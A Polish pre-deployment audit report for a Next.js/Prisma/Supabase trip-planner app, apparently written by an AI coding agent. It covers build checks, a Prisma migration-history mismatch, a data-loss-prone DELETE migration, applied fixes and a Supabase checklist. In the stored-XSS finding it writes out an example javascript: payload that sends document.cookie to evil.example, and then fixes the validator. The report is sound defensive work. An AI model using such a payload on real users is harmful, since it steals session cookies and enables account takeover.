# Audyt przed wdrożeniem produkcyjnym

Data audytu: 2026-07-28, zaktualizowano 2026-07-29
Poprzedni audyt: 2026-07-27 (commit `2f923a8`)
Stan repozytorium w chwili audytu: branch `main`, HEAD `b8f0d7d`, plus zmiany w working tree (patrz sekcja 4)

## 1. Werdykt

**READY WITH WARNINGS**

Kod przechodzi lint, typecheck, walidację Prisma i produkcyjny build. `npm audit --omit=dev` zgłasza 0
podatności. Smoke test produkcyjnego serwera (bez logowania) potwierdza poprawną ochronę tras, poprawne
statusy API i nagłówki bezpieczeństwa. Cztery jednoznaczne problemy (XSS przez `productLinks`, brak
`migration_lock.toml`, brak `revalidatePath` po usunięciu dnia, brak serializacji importu AI z dopisywaniem/
usuwaniem dni) zostały naprawione i zweryfikowane w ramach tego audytu.

Aplikacja **nie jest jednak gotowa do wdrożenia bez świadomej decyzji właściciela** w dwóch obszarach:
istorii migracji Prisma niezgodnej z bazą docelową oraz potencjalnej utraty danych „unassigned stops” przy
migracji `20260728160000_remove_unassigned_stops` na innej bazie niż ta użyta w audycie. Żadne z tych
działań nie zostało wykonane w ramach audytu (zgodnie z ograniczeniami) — wymagają jawnej decyzji i
kontrolowanego wykonania przez właściciela projektu.

## 2. Executive summary

- **Czy można wdrażać:** tak, pod warunkiem że przed `prisma migrate deploy` na docelowej bazie
  produkcyjnej właściciel świadomie zdecyduje, jak rozwiązać niezgodność historii migracji (sekcja 8) i
  potwierdzi, czy docelowa baza zawiera niezmigrowane „unassigned stops” (potencjalna utrata danych).
- **Co blokuje pełne "READY FOR DEPLOY":** brak wpisu w tabeli `_prisma_migrations` dla 4 istniejących
  migracji, mimo że lokalna baza deweloperska już ma zastosowany docelowy schemat (prawdopodobnie przez
  wcześniejsze `prisma db push`). To rozjazd między stanem faktycznym bazy a historią migracji — bezpieczny
  do naprawienia tylko świadomą decyzją (`migrate resolve --applied` vs. rzeczywiste uruchomienie migracji
  na czystej bazie), nie automatyczną poprawką.
- **Największe pozostałe ryzyko:** migracja `remove_unassigned_stops` trwale usuwa (`DELETE FROM
  trip_stops WHERE trip_day_id IS NULL`) każdy nieprzypisany do dnia punkt trasy. Na bazie użytej w tym
  audycie efekt już zaszedł wcześniej (schemat już ma `NOT NULL`), ale na **każdej innej bazie** (np.
  docelowej produkcyjnej Supabase, jeśli różni się od bazy deweloperskiej), która wciąż ma stare
  „unassigned stops”, to polecenie bezpowrotnie skasuje te dane bez kopii zapasowej ani ostrzeżenia.

## 3. Zakres i metodologia

**Sprawdzono:**
- Pełną historię zmian od poprzedniego audytu (`2f923a8`) przez 2 commity (`efec18a`, `b8f0d7d`) oraz
  wszystkie niezacommitowane zmiany w working tree i nowe nieśledzone pliki.
- Statyczne kontrole: ESLint, `tsc --noEmit`, `prisma validate`, `prisma generate`, `next build`, `npm
  audit --omit=dev`, `npm ci` (powtarzalność lockfile).
- Ręczny przegląd kodu Server Actions, Route Handlers, middleware, klientów Supabase, walidatorów Zod,
  schematu Prisma i 4 nowych migracji SQL.
- Dwa niezależne, równoległe przeglądy pogłębione (subagenci): (1) bezpieczeństwo/autoryzacja wszystkich
  zmienionych Server Actions i nowej funkcji importu AI, (2) regresje funkcjonalne w zmienionych modułach
  (trip-days, trip-stops, packing, fuel, stays, planner-view).
- Read-only introspekcję rzeczywistej bazy danych (`prisma db pull --print`, `prisma migrate status`,
  `SELECT COUNT(*)` na `trip_stops`) w celu porównania stanu faktycznego ze schematem i migracjami — bez
  żadnego zapisu.
- Smoke test produkcyjnego builda (`next start` na porcie 3100, osobnym od aktywnego procesu deweloperskiego
  użytkownika na porcie 3000, żeby go nie zakłócić) obejmujący strony publiczne, ochronę tras, endpointy API
  bez sesji, nagłówki bezpieczeństwa, `robots.txt`, `sitemap.xml` i stronę 404.

**Nie sprawdzono (i dlaczego):**
- **Zalogowany CRUD w przeglądarce** (tworzenie/edycja podróży, dni, punktów, itd.) — audyt nie miał
  dostępu do konta testowego ani nie mógł bezpiecznie tworzyć nowych kont/danych na współdzielonej bazie
  deweloperskiej bez ryzyka zanieczyszczenia realnych danych. Zamiast tego zweryfikowano logikę serwerową
  (autoryzację, walidację, transakcyjność) przez przegląd kodu.
- **Panel Supabase** (Auth redirect URLs, RLS, granty, konfiguracja bucketa Storage) — niemożliwe do
  potwierdzenia z repozytorium; oznaczone jako kontrola manualna (sekcja 11).
- **Testy automatyczne** — repozytorium nie zawiera żadnego frameworka testowego ani skryptu `test` w
  `package.json`. To jawne ryzyko, nie ukryty brak — patrz sekcja 8.
- **Testy E2E i testy izolacji RLS na żywo** — wymagają działającego środowiska przeglądarkowego z
  prawdziwymi dwoma kontami użytkowników; przygotowano dokładną checklistę manualną (sekcja 11), ale jej nie
  wykonano.

## 4. Analiza ostatnich zmian

Zmiany od poprzedniego audytu dzielą się na 2 zacommitowane commity i niezacommitowane zmiany w working
tree (18 zmodyfikowanych plików, 1 usunięty, 3 nowe nieśledzone, w tym katalog migracji).

| Zmiana | Pliki | Ryzyko | Weryfikacja | Wynik |
| --- | --- | --- | --- | --- |
| Usunięcie funkcji „unassigned stops” (punkty bez przypisanego dnia); `TripStop.tripDayId` i `TripActivity.tripDayId` → `NOT NULL` | `prisma/schema.prisma`, `src/lib/db/trip-stops.ts`, `src/features/trip-stops/actions.ts`, usunięty `unassigned-stops-panel.tsx`, nowa migracja `20260728160000_remove_unassigned_stops` | Wysokie — migracja trwale usuwa dane na bazach, które mają stare nieprzypisane punkty | Przegląd kodu + grep całego `src/` za dead code + read-only introspekcja żywej bazy | Kod czysty (zero martwych referencji), ale migracja niesie ryzyko utraty danych na innej bazie niż deweloperska — patrz sekcja 8 |
| Nowa funkcja importu planu z AI (wklejenie JSON wygenerowanego przez LLM) | `src/features/trips/components/ai-trip-import-dialog.tsx` (nowy), `src/lib/db/trip-stops.ts` (`importTripDayStops`), `src/lib/validators/trip-stop.ts` (`aiDayStopsImportSchema`) | Wysokie — wektor wejścia z zewnętrznego/niezaufanego źródła, bulk insert, opcja `replaceExisting` kasująca istniejące dane dnia | Przegląd bezpieczeństwa (autoryzacja, limity, transakcyjność), przegląd renderowania pól tekstowych | Poprawnie autoryzowane przez `tripWriteAccessWhere`, limity `.max(20)` na elementy, transakcja atomowa, brak IDOR |
| Nowy panel notatek trasy | `src/features/trip-days/components/route-notes-panel.tsx` (nowy, 340 linii) | Średnie — renderowanie markdownu użytkownika | Przegląd `SafeMarkdown`/`renderInline` | Bezpieczne — brak `dangerouslySetInnerHTML`, linki ograniczone do `https?://` |
| Rozbudowa listy pakowania: ceny, linki produktowe, kategorie na poziomie podróży | `src/features/trip-packing/*`, `src/lib/db/trip-packing-items.ts`, `src/lib/validators/trip-packing-item.ts`, 3 migracje `packing_*` | Wysokie — `productLinks.url` renderowane jako `href` bez ograniczenia schematu | Przegląd walidatora + miejsce renderowania (`packing-dashboard.tsx:1062`) | **Znaleziono i naprawiono** stored XSS przez `javascript:`/`data:` URL — patrz sekcja 5 i 6 |
| Duży refaktor głównego widoku plannera i panelu dnia | `src/features/trips/components/planner-view.tsx` (838 linii), `src/features/trip-days/components/day-panel.tsx` (574 linie) | Wysokie (rozmiar zmiany) | Przegląd regresji: hooki, drag&drop, stany 0/1/wiele dni, cache invalidation | Znaleziono i naprawiono brak `revalidatePath` po usunięciu dnia oraz nieserializowany import AI względem dodawania/usuwania dni |
| Moduł paliwa: nowa karta podsumowania, refaktor dashboardu | `src/features/fuel/*`, `src/lib/db/fuel-prices.ts` (nowy) | Niskie | Przegląd NaN/dzielenia przez zero | Brak nowych problemów |
| Rebranding na „Tripzo” (favicon, logo) | `public/logo*.png`, `src/components/shared/app-logo.tsx`, `src/app/layout.tsx` (commit `efec18a`, poza bieżącym zakresem zmian, ale w diffie od poprzedniego audytu) | Niskie | Przegląd metadanych | Niespójność: `<title>`/Open Graph nadal mówią „RoadTrip Planner” mimo zmiany logo na Tripzo — kosmetyczne, nieblokujące (sekcja 9) |

## 5. Znalezione problemy

### [High] Stored XSS przez `productLinks.url` z dowolnym schematem URL — NAPRAWIONE

- **Plik:** `src/lib/validators/trip-packing-item.ts:70` (walidator), renderowanie w
  `src/features/trip-packing/components/packing-dashboard.tsx:1062`
- **Opis:** `productLinkSchema.url` używało samego `z.string().url()`, które akceptuje dowolny schemat URL,
  w tym `javascript:` i `data:text/html,...`. Klient (`normalizeProductUrl`) ogranicza się do `http(s)`
  przed wysłaniem, ale Server Action nie miał tego samego ograniczenia.
- **Realny scenariusz ataku:** współpracownik podróży (rola `editor`) woła Server Action bezpośrednio
  (np. przez devtools/curl z ważną sesją), pomijając UI, i zapisuje link produktowy z wartością
  `javascript:fetch('https://evil.example/steal?c='+document.cookie)`. Link trafia do bazy i renderuje się
  jako `<a href="javascript:...">` dla każdego innego współpracownika podróży (w tym właściciela). Kliknięcie
  wykonuje kod JS w kontekście sesji ofiary.
- **Poprawka:** dodano `.refine()` wymuszający `protocol === "http:" || "https:"` po stronie serwera, spójnie
  z logiką klienta.
- **Status:** naprawione i zweryfikowane (lint, typecheck, build przechodzą po zmianie).

### [Medium] Brak `revalidatePath` po usunięciu dnia podróży — NAPRAWIONE

- **Plik:** `src/features/trip-days/actions.ts:75-86` (`deleteTripDayAction`)
- **Opis:** W przeciwieństwie do sąsiednich akcji (`updateTripDayAction`, `reorderTripDaysAction`),
  `deleteTripDayAction` nie wywoływało `revalidatePath`. Po stronie klienta (`planner-view.tsx:703-718`)
  `router.refresh()` jest wywoływane tylko na ścieżce błędu (rollback), nie na sukcesie — stan kliencki jest
  aktualizowany optymistycznie, ale cache Next.js Router Cache dla `/trips/[tripId]` nigdy nie jest unieważniany.
- **Realny scenariusz błędu:** użytkownik usuwa dzień, UI wygląda poprawnie (optymistyczna aktualizacja), ale
  po nawigacji do innej zakładki i powrocie przez link (soft navigation) w oknie cache może zobaczyć usunięty
  dzień z powrotem, ponieważ RSC payload nie został odświeżony po stronie serwera.
- **Poprawka:** dodano `revalidatePath(\`/trips/${tripId}\`)` po udanym usunięciu, analogicznie do pozostałych
  mutacji w tym pliku. Zmieniono też `_tripId` na `tripId` (parametr był już przekazywany, tylko nieużywany).
- **Status:** naprawione i zweryfikowane.

### [High] Migracja `remove_unassigned_stops` trwale usuwa dane bez zabezpieczenia — NIE NAPRAWIONE (decyzja właściciela)

- **Plik:** `prisma/migrations/20260728160000_remove_unassigned_stops/migration.sql`
- **Opis:** `DELETE FROM "trip_stops" WHERE "trip_day_id" IS NULL` kasuje bezpowrotnie każdy punkt trasy
  niezwiązany z żadnym dniem (i kaskadowo jego aktywności), bez eksportu, logowania ani ostrzeżenia.
- **Realny scenariusz:** jeśli którakolwiek podróż na docelowej bazie produkcyjnej ma nieprzypisane punkty
  (funkcja „unassigned stops” istniała w poprzedniej wersji aplikacji), te dane znikną bezpowrotnie przy
  zastosowaniu tej migracji.
- **Stan zweryfikowany w audycie:** baza, do której podłączony jest lokalny `.env.local`, **już ma**
  zastosowany docelowy schemat (`tripDayId NOT NULL` potwierdzone przez `prisma db pull --print`), więc na
  tej konkretnej bazie efekt usunięcia (jeśli dane istniały) już zaszedł wcześniej, prawdopodobnie przez
  `prisma db push` w toku developmentu — nie przez tę migrację. Migracja jednak zostanie odtworzona w
  historii migracji na **każdej innej bazie** (docelowa produkcja, jeśli to inny projekt Supabase).
- **Rekomendacja (nie wykonano — wymaga decyzji biznesowej):**
  1. Przed zastosowaniem tej migracji na docelowej bazie produkcyjnej: `SELECT COUNT(*) FROM trip_stops
     WHERE trip_day_id IS NULL;` — jeśli wynik > 0, zdecydować: (a) przenieść te punkty do nowego,
     końcowego dnia podróży zamiast je kasować, albo (b) wyeksportować je do pliku przed usunięciem, albo
     (c) świadomie zaakceptować utratę.
  2. Nie uruchamiać tej migracji automatycznie/bez potwierdzenia właściciela danych produkcyjnych.
- **Status:** pozostawione jako blocker wymagający jawnej decyzji — zgodnie z ograniczeniami audytu.

### [High] Rozjazd historii migracji Prisma z rzeczywistym stanem bazy — NIE NAPRAWIONE (decyzja właściciela)

- **Plik:** `prisma/migrations/*` (4 migracje) vs. tabela `_prisma_migrations` na bazie z `.env.local`
- **Opis:** `prisma migrate status` (odczyt, bez zmian) raportuje, że wszystkie 4 migracje „nie zostały
  jeszcze zastosowane”, mimo że introspekcja (`prisma db pull --print`) potwierdza, że rzeczywisty schemat
  bazy **już zawiera** wszystkie te zmiany (kolumny `price`, `is_purchased`, `product_links`,
  `packing_categories`, `trip_day_id NOT NULL`). To typowy efekt pracy przez `prisma db push` (opisanej w
  README jako metoda deweloperska) bez równoległego odkładania migracji do tabeli historii.
- **Realny scenariusz błędu:** uruchomienie `prisma migrate deploy` na tej bazie próbowałoby ponownie
  wykonać już zastosowane DDL. Część operacji jest idempotentna (`ALTER COLUMN ... SET NOT NULL` na
  kolumnie już `NOT NULL` zwykle nie błądzi), ale `DELETE FROM trip_stops WHERE trip_day_id IS NULL` oraz
  `ADD COLUMN` na już istniejącej kolumnie **zakończą się błędem** i przerwą deployment.
- **Rekomendacja (nie wykonano — wymaga jawnego potwierdzenia bazy docelowej):**
  1. Potwierdzić, czy baza produkcyjna to ta sama, do której odnosi się obecny `.env.local`, czy inna.
  2. Jeśli to ta sama baza (lub baza w identycznym stanie): oznaczyć migracje jako już zastosowane przez
     `prisma migrate resolve --applied <nazwa>` dla każdej z 4 migracji, **nie** przez `migrate deploy`.
  3. Jeśli to inna, czysta baza: zweryfikować, że migracje uruchamiają się poprawnie od zera (dopiero wtedy
     `migrate deploy` jest bezpieczne), ze szczególną uwagą na scenariusz z poprzedniego punktu (dane
     `unassigned stops`).
  4. Od tego momentu każda zmiana schematu musi przechodzić przez `prisma migrate dev` (generujące
     migrację + `migration_lock.toml`), nie przez ręcznie pisane pliki SQL ani `db push`.
- **Naprawiono częściowo w ramach audytu:** brakujący `prisma/migrations/migration_lock.toml` (patrz sekcja
  6) — bez niego `prisma migrate status`, `migrate diff` i `migrate deploy` w ogóle nie działały
  (`Error: Could not determine the connector from the migrations directory`). Dodanie tego pliku jest czysto
  deklaratywne (`provider = "postgresql"`, zgodnie z `datasource db` w schemacie), nie dotyka bazy danych i
  jest wymagane niezależnie od decyzji o punktach 1-4 powyżej.
- **Status:** blocker pozostaje otwarty — wymaga decyzji właściciela co do docelowej bazy, zanim jakakolwiek
  komenda `migrate deploy`/`resolve` zostanie uruchomiona.

### [Medium] Import całej podróży z AI nie był w pełni serializowany z równoległymi akcjami na dniach — NAPRAWIONE

- **Plik:** `src/features/trips/components/planner-view.tsx` (`importWholeTrip`, `addDay`, `removeDay`)
- **Opis:** Wszystkie inne przepływy mutujące dni (`addDay`, `removeDay`) przechodzą przez kolejkę
  `enqueueDayWrite`, która serializuje wywołania `createTripDayAction`/`deleteTripDayAction` względem
  optymistycznej listy dni. `importWholeTrip` (pętla usuń-i-odtwórz dla importu AI) wywoływała te same akcje
  bezpośrednio, bez tej kolejki.
- **Realny scenariusz błędu:** użytkownik klikał „Dodaj dzień” w trakcie trwającego importu AI (który może
  trwać kilka-kilkanaście sekund dla wielu dni) — dwa niezserializowane strumienie zapisu do tej samej listy
  dni mogły doprowadzić do niespójnej kolejności `dayNumber` lub utraty optymistycznie dodanego dnia w UI.
- **Poprawka:** `importWholeTrip` teraz woła `deleteTripDayAction`/`createTripDayAction` przez
  `enqueueDayWrite`, tak jak `addDay`/`removeDay`, więc wszystkie trzy strumienie zapisu na dniach dzielą tę
  samą kolejkę FIFO. Dodatkowo dodano stan `isImportingTrip`, który wyłącza przyciski „Add day”/„Add first
  day” oraz wczesny `return` w `removeDay` na czas trwania importu — więc w praktyce te akcje w ogóle nie
  wystartują równolegle, a kolejka jest zabezpieczeniem drugiej warstwy, gdyby coś innego wywołało te funkcje.
  Nie zmieniono żadnej reguły biznesowej ani UX importu samego w sobie (dialog importu miał już własny stan
  `importing` blokujący podwójne wysłanie).
- **Status:** naprawione i zweryfikowane (lint, typecheck, build przechodzą po zmianie).

### [Low] Niespójność brandingu: metadane strony nadal „RoadTrip Planner” mimo rebrandingu na „Tripzo”

- **Plik:** `src/app/layout.tsx:27,42`, `src/app/reset-password/page.tsx:8`
- **Opis:** Commit `efec18a` zmienił logo/favicon na „Tripzo”, ale `<title>`, Open Graph title i tytuł
  strony resetu hasła nadal używają „RoadTrip Planner”.
- **Status:** nienaprawione — to decyzja brandingowa właściciela, nie błąd; zgłoszone jako ostrzeżenie
  nieblokujące (sekcja 9).

## 6. Wprowadzone poprawki

| Plik | Zmiana | Uzasadnienie | Wpływ |
| --- | --- | --- | --- |
| `src/lib/validators/trip-packing-item.ts` | Dodano `.refine()` do `productLinkSchema.url` wymuszający schemat `http:`/`https:` | Zamyka stored-XSS przez `javascript:`/`data:` URL, gdy Server Action jest wołany z pominięciem klienckiej walidacji | Brak wpływu na istniejące poprawne linki (http/https); odrzuca tylko niebezpieczne schematy — bez zmiany reguł biznesowych |
| `src/features/trip-days/actions.ts` | Dodano `revalidatePath(\`/trips/${tripId}\`)` w `deleteTripDayAction`; zmieniono nieużywany parametr `_tripId` na `tripId` | Naprawia stały cache po usunięciu dnia, spójnie z pozostałymi akcjami w tym pliku | Czysto techniczna poprawka cache; brak zmiany zachowania UI w normalnym przepływie |
| `prisma/migrations/migration_lock.toml` (nowy plik) | Dodano standardowy plik blokady dostawcy Prisma (`provider = "postgresql"`) | Bez niego cały tooling migracji (`migrate status`, `migrate diff`, `migrate deploy`) jest niefunkcjonalny — plik jest czysto deklaratywny, generowany automatycznie przez `prisma migrate dev`, nie dotyka bazy danych | Wymagany warunek wstępny do jakiejkolwiek przyszłej operacji `migrate deploy`/`resolve`; nie wykonuje żadnej migracji sam w sobie |
| `src/features/trips/components/planner-view.tsx` | `importWholeTrip` woła teraz `deleteTripDayAction`/`createTripDayAction` przez `enqueueDayWrite`; dodano stan `isImportingTrip` blokujący przyciski „Add day”/„Add first day” i wczesny return w `removeDay` na czas importu | Serializuje mutacje dni z importu AI z ręcznym dodawaniem/usuwaniem dni, zapobiegając niespójnej kolejności `dayNumber` przy równoległej interakcji | Zmiana wyłącznie w warstwie serializacji zapisów; brak zmiany UX importu (dialog miał już własny stan `importing`), brak zmiany reguł biznesowych |

Żadna z poprawek nie wymagała zmiany wersji zależności, migracji bazy danych, sekretów ani zmiany reguł
biznesowych. Wszystkie zweryfikowano pełnym zestawem kontroli (lint, typecheck, `prisma validate`, build,
`npm audit`) po wprowadzeniu.

## 7. Wyniki kontroli

| Kontrola | Wynik | Szczegóły |
| --- | --- | --- |
| `npm ci` | OK | Czysty, powtarzalny install; lockfile zgodny z `package.json`. Ostrzeżenie `EBADENGINE` — lokalny Node to v26, wymagane `22.x`; bez wpływu na Vercel, który respektuje `engines.node` z `package.json` |
| `npm run lint` | OK | 0 błędów, 0 ostrzeżeń (przed i po poprawkach) |
| `npm run typecheck` (`tsc --noEmit`) | OK | 0 błędów (przed i po poprawkach) |
| `npx prisma validate` | OK | Schemat poprawny |
| `npx prisma generate` | OK | Klient wygenerowany bez błędów |
| `npx prisma migrate status` | **Rozjazd** | 4 migracje nieodnotowane w `_prisma_migrations`, mimo że schemat bazy już je zawiera — patrz sekcja 5/8 |
| `npm run build` (`next build`) | OK | Build produkcyjny przechodzi; `/trips/[tripId]` — 484 kB First Load JS (największa trasa) |
| `npm audit --omit=dev` | OK | 0 podatności |
| Pełny `npm audit` (z dev) | 9 high | Wyłącznie w toolchainie ESLint (dev-only), bez wpływu na graf produkcyjny — zgodnie z poprzednim audytem, nie naprawiano (wymagałoby ryzykownej migracji major) |
| Testy automatyczne | **Brak** | Brak skryptu `test` w `package.json`, brak frameworka testowego w repo. Jawne ryzyko — nie zastąpione przeglądem kodu |
| Smoke test `next start` (port 3100) | OK | Patrz szczegóły niżej |

**Szczegóły smoke testu (bez sesji, serwer produkcyjny lokalnie):**

| Endpoint | Oczekiwane | Wynik |
| --- | --- | --- |
| `GET /` | 200 | 200 |
| `GET /login` | 200 | 200 |
| `GET /register` | 200 | 200 |
| `GET /trips/{id}` bez sesji | redirect do `/` | 307 → `/` |
| `GET /profile` bez sesji | redirect do `/` | 307 → `/` |
| `GET /settings` bez sesji | redirect do `/` | 307 → `/` |
| `GET /api/geocode` bez sesji | 401 | 401 |
| `GET /api/geocode/reverse` bez sesji | 401 | 401 |
| `GET /api/geocode/poi` bez sesji | 401 | 401 |
| `GET /robots.txt` | poprawny, blokuje prywatne trasy | OK |
| `GET /sitemap.xml` | poprawny XML | OK |
| `GET /nieistniejąca-strona` | 404 z poprawnym tytułem | 404, tytuł strony OK |
| Nagłówki bezpieczeństwa (`/`) | CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy | Wszystkie obecne i poprawnie skonfigurowane |

Build produkcyjny (`.next/`) sprawdzony pod kątem przypadkowo wbudowanych sekretów (`sk_live`,
`SUPABASE_SERVICE_ROLE`, connection stringi) — brak trafień.

## 8. Blokery deploymentu

1. **Rozjazd historii migracji Prisma z docelową bazą produkcyjną** (sekcja 5). Przed pierwszym
   `prisma migrate deploy` na produkcji trzeba jawnie zdecydować, czy baza docelowa już ma ten schemat
   (→ `migrate resolve --applied` dla 4 migracji) czy jest czysta (→ zwykłe `migrate deploy`, po
   weryfikacji na kopii/staging).
2. **Ryzyko utraty danych w migracji `remove_unassigned_stops`** (sekcja 5) — wymaga sprawdzenia,
   czy docelowa baza produkcyjna zawiera nieprzypisane punkty trasy, zanim ta migracja zostanie
   zastosowana.
3. **Konfiguracja Supabase (Auth redirect URLs, RLS/granty, Storage bucket) nie może być potwierdzona z
   repozytorium** — wymaga manualnej weryfikacji w panelu Supabase przed promocją do produkcji (checklista
   w sekcji 11). To nie jest nowy blocker (zgłoszony też w poprzednim audycie), ale pozostaje otwarty.

Żaden z powyższych bloków nie wynika z jakości kodu aplikacji (lint/typecheck/build/audit są czyste) — to
wyłącznie operacyjne kroki dotyczące stanu bazy danych i konfiguracji Supabase, które z definicji wymagają
decyzji i działania właściciela projektu, nie automatycznej poprawki.

## 9. Ostrzeżenia nieblokujące

- **Brak testów automatycznych** — najwyższy priorytet długu technicznego. Warto zacząć od testów
  autoryzacji/IDOR dla Server Actions (rola `viewer` vs `editor` vs `owner`) i testu transakcyjności
  `importTripDayStops`, potem rozszerzyć na E2E CRUD i odzyskiwanie hasła.
- **Niespójność brandingu** „RoadTrip Planner” vs „Tripzo” w metadanych strony (sekcja 5) — kosmetyczne,
  pozostawione jako decyzja właściciela (sekcja 14).
- Pełny `npm audit` (z dev) zgłasza 9 podatności high wyłącznie w toolchainie ESLint — bez wpływu na
  produkcję, naprawa wymagałaby ryzykownej migracji major (ESLint 10 / Next 16), celowo nie wykonana.
- Główny ekran plannera pozostaje ciężki: 484 kB First Load JS dla `/trips/[tripId]` (wzrost z ~462 kB w
  poprzednim audycie, spójny z dodaniem modułu importu AI i rozbudowanego dashboardu pakowania). Warto
  rozważyć dalszy podział dynamiczny (`next/dynamic`) dla nowych, dużych komponentów
  (`ai-trip-import-dialog.tsx`, rozbudowany `packing-dashboard.tsx`).
- Powtarzany upload zdjęcia hero nadal nie usuwa poprzedniego pliku ze Storage (znane ograniczenie z
  poprzedniego audytu, niezmienione).
- Brakuje trwałego rate limitera na endpointach geokodowania — nadal chronione tylko wymogiem sesji, bez
  limitu per-user/IP (znane ograniczenie z poprzedniego audytu).
- Lokalny Node to v26, `package.json` wymaga `22.x` — bez wpływu na Vercel (który honoruje `engines.node`),
  ale warto ujednolicić środowisko deweloperskie (np. `.nvmrc`) dla spójności z produkcją.

## 10. Zmienne Vercela

| Zmienna | Publiczna/serwerowa | Wymagana | Production | Preview | Cel |
| --- | --- | --- | --- | --- | --- |
| `DATABASE_URL` | serwerowa | tak | tak | tak | Runtime Prisma — pooled connection (transaction pooler) |
| `DIRECT_URL` | serwerowa | tak (do migracji) | tak | tak | Migracje Prisma — direct/session pooler, nieużywana w runtime funkcji |
| `NEXT_PUBLIC_SUPABASE_URL` | publiczna | tak | tak | tak | URL projektu Supabase — bezpieczna do ekspozycji |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | publiczna | tak | tak | tak | Klucz anon Supabase Auth — bezpieczeństwo danych zależy od autoryzacji w kodzie aplikacji, nie od tego klucza |
| `NEXT_PUBLIC_SITE_URL` | publiczna | zalecana | tak | zalecana (osobna wartość per środowisko) | Kanoniczny URL do metadanych, robots.txt, sitemap.xml |
| `VERCEL_PROJECT_PRODUCTION_URL` | systemowa (auto) | nie | auto | auto | Fallback dla `getSiteUrl()`, dostarczana automatycznie przez Vercel |
| `VERCEL_URL` | systemowa (auto) | nie | auto | auto | Fallback dla środowisk preview |

Aplikacja nie używa i nie wymaga klucza `service_role` Supabase — potwierdzone przeglądem całego kodu
(`src/lib/supabase/*` używa wyłącznie `NEXT_PUBLIC_SUPABASE_ANON_KEY`). Wartości zmiennych nie są ujawnione
w tym raporcie ani nigdzie w repozytorium.

## 11. Manualna checklista Supabase

Panel Supabase nie jest dostępny z poziomu repozytorium — poniższe wymaga ręcznej weryfikacji przed
promocją do produkcji.

### Auth
- [ ] Ustawić produkcyjny `Site URL` w Supabase → Authentication → URL Configuration.
- [ ] Dodać dokładny produkcyjny `/auth/callback` URL do dozwolonych Redirect URLs.
- [ ] Jeśli Preview ma korzystać z tego samego projektu Supabase, dodać kontrolowany wzorzec URL Vercel
      preview (np. `https://*-<team>.vercel.app/auth/callback`).
- [ ] Zweryfikować provider Email, dostawcę SMTP i szablony (rejestracja, reset hasła).
- [ ] Ręcznie przetestować: link odzyskiwania hasła wygasły, użyty ponownie, zmodyfikowany.

### Baza i RLS
- [ ] Sprawdzić RLS i granty każdej tabeli dostępnej przez PostgREST — aplikacja łączy się do bazy przez
      Prisma rolą właściciela tabeli (`postgres.<project-ref>`), która **omija RLS domyślnie**; autoryzacja
      Prisma jest wymuszana w kodzie (`tripAccessWhere`/`tripWriteAccessWhere`), nie przez RLS.
- [ ] Jeśli frontend kiedykolwiek zacznie odpytywać Supabase bezpośrednio (PostgREST z kluczem anon), RLS
      musi być wtedy skonfigurowane — obecnie kod tego nie robi (zweryfikowane grepem `supabase.from(` poza
      Storage — brak wystąpień poza modułem hero image), ale to należy monitorować przy przyszłych zmianach.
- [ ] Manualny test IDOR: zalogować się jako Użytkownik A, spróbować odczytać/edytować podróż należącą do
      Użytkownika B, podmieniając `tripId` w URL bezpośrednio.
- [ ] Manualny test roli `viewer`: zalogować się jako współpracownik z rolą `viewer`, spróbować wykonać
      dowolną mutację (dodanie punktu, edycję dnia, import AI) przez UI i bezpośrednie wywołanie Server
      Action — oczekiwany wynik: odmowa po stronie serwera niezależnie od tego, czy UI ukrywa kontrolki.
- [ ] Bezpośrednie wywołanie Supabase REST (`https://<project>.supabase.co/rest/v1/trips?select=*`) z
      kluczem anon i tokenem sesji innego użytkownika — potwierdzić brak dostępu do cudzych danych.

### Storage
- [ ] Potwierdzić istnienie bucketa `trip-hero-images`.
- [ ] Zweryfikować politykę: insert/update/delete tylko dla zalogowanego użytkownika, tylko w folderze
      `{auth.uid}/...` (kod zapisuje pod ścieżką `${user.id}/${tripId}/hero-*.ext`).
- [ ] Ustawić limit rozmiaru na poziomie bucketa (kod już limituje do 8 MB po stronie aplikacji, ale
      warto mieć też twardy limit w Supabase) i allowlistę MIME (JPEG/PNG/WEBP/GIF).
- [ ] Manualny test: próba zapisu/usunięcia pliku w folderze innego użytkownika (podmiana `user.id` w
      ścieżce przez bezpośrednie wywołanie Storage API) — oczekiwana odmowa.
- [ ] Potwierdzić model `getPublicUrl` (publiczny odczyt) jest świadomą decyzją, nie przeoczeniem — obrazy
      hero są publicznie czytelne pod znanym URL-em.

### Pooling / połączenia
- [ ] Potwierdzić, że `DATABASE_URL` używa transaction poolera (zwykle port 6543, `pgbouncer=true`) z
      rozsądnym `connection_limit` dla środowiska serverless.
- [ ] Potwierdzić, że `DIRECT_URL` używa session/direct poolera (zwykle port 5432) i **nie** jest używany
      jako połączenie runtime.
- [ ] Pod krótkim obciążeniem sprawdzić brak błędów wyczerpania puli połączeń.

## 12. Plan deploymentu

1. **Przed Preview:** zdecydować i wykonać krok dotyczący historii migracji (blocker #1, sekcja 8) —
   albo `migrate resolve --applied` dla wszystkich 4 migracji na bazie deweloperskiej/stagingowej, jeśli to
   ta sama baza co produkcyjna docelowa, albo zweryfikować migracje od zera na czystej bazie stagingowej.
2. Zweryfikować blocker #2 (dane `unassigned stops` na docelowej bazie) przed zastosowaniem migracji
   `remove_unassigned_stops`.
3. Zacommitować bieżące zmiany (ten audyt ich nie commituje — wymaga jawnej zgody właściciela) razem z
   dwoma poprawkami bezpieczeństwa/cache wprowadzonymi w tym audycie oraz nowym `migration_lock.toml`.
4. Wykonać checklistę manualną Supabase (sekcja 11) na projekcie produkcyjnym.
5. Utworzyć/potwierdzić projekt Vercel: Framework Preset = Next.js, Node 22.x (z `package.json`
   `engines`), ustawić wszystkie zmienne z sekcji 10 osobno dla Production i Preview.
6. Wdrożyć jako Vercel Preview na zweryfikowanej gałęzi.
7. Na Preview wykonać pełny zalogowany smoke test (sekcja 13) z prawdziwym kontem testowym — **nie**
   istniejącym kontem produkcyjnym.
8. Dopiero po akceptacji Preview: `prisma migrate deploy` na bazie produkcyjnej (kontrolowane, poza
   automatycznym pipeline'em CI, z ręcznym potwierdzeniem), następnie promocja dokładnie tego samego
   commita na Production.
9. Po promocji: powtórzyć kluczowe punkty smoke testu na Production.

## 13. Smoke test po deploymencie

- [ ] `/` ładuje się (200), poprawny tytuł/branding.
- [ ] `/login`, `/register` dostępne bez sesji.
- [ ] `/trips`, `/profile`, `/settings` przekierowują niezalogowanego użytkownika.
- [ ] Rejestracja nowym kontem testowym → potwierdzenie e-mail → logowanie.
